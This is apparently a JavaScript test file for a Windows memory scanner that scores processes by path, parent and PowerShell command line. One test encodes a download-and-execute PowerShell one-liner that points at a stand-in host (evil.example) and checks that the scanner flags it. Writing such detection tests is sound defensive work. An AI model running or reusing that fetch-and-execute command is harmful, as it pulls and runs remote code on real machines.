const test = require('node:test');
const assert = require('node:assert/strict');

const {
  assessProcess,
  decodePowerShellEncodedCommand,
} = require('../utils/memoryScanner');

function psEncode(script) {
  return Buffer.from(script, 'utf16le').toString('base64');
}

test('Windows protected process with hidden WMI path is clean informational signal', () => {
  const result = assessProcess({
    ProcessId: 1768,
    Name: 'svchost.exe',
    Path: null,
    CommandLine: null,
    ParentProcessId: 1576,
    WorkingSetSize: 20 * 1024 * 1024,
  }, [
    { ProcessId: 1576, Name: 'services.exe', Path: null },
  ]);

  assert.equal(result.threat, 'CLEAN');
  assert.equal(result.score, 0);
  assert.equal(result.findings[0].severity, 'info');
  assert.equal(result.findings[0].type, 'LimitedProcessVisibility');
});

test('system process masquerade still reports critical when path is wrong', () => {
  const result = assessProcess({
    ProcessId: 99,
    Name: 'svchost.exe',
    Path: 'C:\\Users\\alexg\\AppData\\Local\\Temp\\svchost.exe',
    CommandLine: 'svchost.exe',
    ParentProcessId: 1,
    WorkingSetSize: 1024,
  }, []);

  assert.equal(result.threat, 'CRITICAL');
  assert.ok(result.findings.some((finding) => finding.type === 'ProcessMasquerade'));
});

test('trusted Codex PowerShell AST helper is not critical', () => {
  const decoded = '# Long-lived PowerShell AST parser used by the Rust command-safety layer on Windows.';
  const result = assessProcess({
    ProcessId: 10,
    Name: 'powershell.exe',
    Path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
    CommandLine: `powershell.exe -NoLogo -NoProfile -NonInteractive -EncodedCommand ${psEncode(decoded)}`,
    ParentProcessId: 9,
    WorkingSetSize: 1024,
  }, [
    {
      ProcessId: 9,
      Name: 'codex.exe',
      Path: 'C:\\Users\\alexg\\.vscode\\extensions\\openai.chatgpt-26.0.0-win32-x64\\bin\\windows-x86_64\\codex.exe',
    },
  ]);

  assert.equal(result.threat, 'CLEAN');
  assert.ok(result.findings.some((finding) => finding.type === 'TrustedEncodedPowerShell'));
});

test('malicious encoded PowerShell remains critical after decoding', () => {
  const decoded = "iex (New-Object Net.WebClient).DownloadString('http://evil.example/p.ps1')";
  const encoded = psEncode(decoded);
  const result = assessProcess({
    ProcessId: 11,
    Name: 'powershell.exe',
    Path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
    CommandLine: `powershell.exe -NoProfile -EncodedCommand ${encoded}`,
    ParentProcessId: 7,
    WorkingSetSize: 1024,
  }, [
    { ProcessId: 7, Name: 'explorer.exe', Path: 'C:\\Windows\\explorer.exe' },
  ]);

  assert.equal(decodePowerShellEncodedCommand(encoded), decoded);
  assert.equal(result.threat, 'CRITICAL');
  assert.ok(result.findings.some((finding) => finding.tag === 'DecodedRiskyPowerShell'));
  assert.ok(result.mitreTechniques.some((technique) => technique.id === 'T1059.001'));
  assert.equal(result.mitreTechniques[0].source.application, 'powershell.exe');
});

test('service metadata is attached to memory MITRE sources', () => {
  const result = assessProcess({
    ProcessId: 50,
    Name: 'powershell.exe',
    Path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
    CommandLine: 'powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass',
    ParentProcessId: 7,
    WorkingSetSize: 1024,
  }, [
    { ProcessId: 7, Name: 'services.exe', Path: 'C:\\Windows\\System32\\services.exe' },
  ], {
    50: [{ Name: 'TestSvc', DisplayName: 'Test Service', State: 'Running' }],
  });

  assert.equal(result.threat, 'SUSPICIOUS');
  assert.equal(result.services[0].displayName, 'Test Service');
  assert.equal(result.mitreTechniques[0].source.services[0].name, 'TestSvc');
});

test('Argus backend node process stays clean', () => {
  const result = assessProcess({
    ProcessId: 11924,
    Name: 'node.exe',
    Path: 'C:\\Program Files\\nodejs\\node.exe',
    CommandLine: '"C:\\Program Files\\nodejs\\node.exe" server.js',
    ParentProcessId: 10020,
    WorkingSetSize: 200 * 1024 * 1024,
  }, []);

  assert.equal(result.threat, 'CLEAN');
});

test('memory scanner PowerShell enumerator is informational', () => {
  const result = assessProcess({
    ProcessId: 22,
    Name: 'powershell.exe',
    Path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
    CommandLine: 'powershell -NonInteractive -ExecutionPolicy Bypass -Command "Get-CimInstance Win32_Process | Select-Object ProcessId,Name,Path,ExecutablePath,CommandLine,ParentProcessId,WorkingSetSize | ConvertTo-Json -Depth 2 -Compress"',
    ParentProcessId: 21,
    WorkingSetSize: 80 * 1024 * 1024,
  }, [
    { ProcessId: 21, Name: 'node.exe', Path: 'C:\\Program Files\\nodejs\\node.exe' },
  ]);

  assert.equal(result.threat, 'CLEAN');
  assert.ok(result.findings.some((finding) => finding.severity === 'info' && finding.type === 'PS_PolicyBypass'));
});

test('PowerShell process without visible parent does not crash assessment', () => {
  const result = assessProcess({
    ProcessId: 24,
    Name: 'powershell.exe',
    Path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
    CommandLine: 'powershell -NonInteractive -ExecutionPolicy Bypass -Command "Get-Process | ConvertTo-Json"',
    ParentProcessId: 999999,
    WorkingSetSize: 80 * 1024 * 1024,
  }, []);

  assert.equal(result.parentName, '');
  assert.equal(result.threat, 'SUSPICIOUS');
  assert.ok(result.findings.some((finding) => finding.type === 'PS_PolicyBypass'));
});

test('memory scanner service enumerator is informational', () => {
  const result = assessProcess({
    ProcessId: 23,
    Name: 'powershell.exe',
    Path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
    CommandLine: 'powershell -NonInteractive -ExecutionPolicy Bypass -Command "Get-CimInstance Win32_Service | Where-Object { $_.ProcessId -ne 0 } | Select-Object ProcessId,Name,DisplayName,State | ConvertTo-Json -Depth 2 -Compress"',
    ParentProcessId: 21,
    WorkingSetSize: 80 * 1024 * 1024,
  }, [
    { ProcessId: 21, Name: 'node.exe', Path: 'C:\\Program Files\\nodejs\\node.exe' },
  ]);

  assert.equal(result.threat, 'CLEAN');
  assert.ok(result.findings.some((finding) => finding.severity === 'info' && finding.type === 'PS_PolicyBypass'));
});
